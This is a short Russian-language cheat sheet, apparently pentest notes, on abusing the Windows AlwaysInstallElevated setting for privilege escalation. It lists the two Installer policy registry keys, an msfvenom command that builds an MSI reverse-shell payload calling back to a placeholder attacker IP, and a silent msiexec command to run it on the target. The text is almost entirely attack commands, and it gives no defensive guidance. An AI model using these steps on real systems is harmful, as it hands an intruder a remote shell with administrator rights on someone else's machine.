# Уязвимость заключается в том, что msi пакеты могут быть установлены с повышенными правами, если в реестре определены определенные значения. Это может позволить злоумышленнику выполнить вредоносный код с правами администратора, если он может заставить пользователя установить вредоносный msi пакет.

# Определим 2 значения в реестре:
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

# Сгенерируем payload:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi

# Установим слушатель на атакующей машине и запустим вредоносный MSI-файл на целевой машине:
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
